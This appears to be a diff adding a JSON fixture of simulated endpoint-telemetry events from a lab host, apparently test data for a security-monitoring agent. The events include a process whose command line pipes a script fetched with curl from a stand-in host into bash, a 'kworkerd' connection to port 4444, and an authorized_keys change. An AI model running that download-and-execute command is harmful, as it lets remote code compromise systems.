@@ -1,0 +1,68 @@
+[
+  {
+    "schema_version": "1.0",
+    "event_id": "01929d5e-4b7a-7c3e-9a51-3f6f0d8c2a11",
+    "occurred_at": "2026-10-13T21:04:05.123Z",
+    "seq": 4182,
+    "category": "process",
+    "action": "start",
+    "host": {"hostname": "lab-web-01", "os": "Ubuntu 24.04 LTS", "ip": ["10.20.0.11"]},
+    "user": {"name": "deploy", "uid": 1001},
+    "process": {
+      "pid": 31337,
+      "ppid": 31210,
+      "name": "bash",
+      "executable": "/usr/bin/bash",
+      "command_line": "bash -c curl -fsSL http://updates.example-cdn.test/i.sh | bash",
+      "parent_name": "sshd",
+      "working_directory": "/home/deploy"
+    }
+  },
+  {
+    "schema_version": "1.0",
+    "event_id": "01929d5e-4b7b-7d10-8f22-1e0b77a41c02",
+    "occurred_at": "2026-10-13T21:04:06Z",
+    "category": "network",
+    "action": "connect",
+    "host": {"hostname": "lab-web-01"},
+    "user": {"name": "deploy", "uid": 1001},
+    "process": {"pid": 31400, "name": "kworkerd"},
+    "network": {
+      "direction": "outbound",
+      "protocol": "tcp",
+      "src_ip": "10.20.0.11",
+      "src_port": 51544,
+      "dst_ip": "198.51.100.23",
+      "dst_port": 4444,
+      "state": "established"
+    }
+  },
+  {
+    "schema_version": "1.0",
+    "event_id": "01929d5e-4b7c-75aa-b3c4-90d3a2c5e4f3",
+    "occurred_at": "2026-10-13T21:05:00+00:00",
+    "category": "file",
+    "action": "modify",
+    "host": {"hostname": "lab-web-01"},
+    "file": {"path": "/home/deploy/.ssh/authorized_keys", "mode": "600", "size": 1142}
+  },
+  {
+    "schema_version": "1.0",
+    "event_id": "01929d5e-4b7d-7f01-a6e5-77c1d9b0f204",
+    "occurred_at": "2026-10-13T21:01:44Z",
+    "category": "authentication",
+    "action": "login_failure",
+    "host": {"hostname": "lab-web-01"},
+    "user": {"name": "root"},
+    "auth": {"method": "password", "outcome": "failure", "source_ip": "203.0.113.45", "target_user": "root", "service": "sshd"}
+  },
+  {
+    "schema_version": "1.0",
+    "event_id": "01929d5e-4b7e-7b22-8c19-5a6e4f3d2105",
+    "occurred_at": "2026-10-13T21:00:00Z",
+    "category": "system",
+    "action": "agent_start",
+    "host": {"hostname": "lab-web-01"},
+    "attributes": {"agent.version": "0.1.0", "collectors": "proc,net,fs,auth"}
+  }
+]
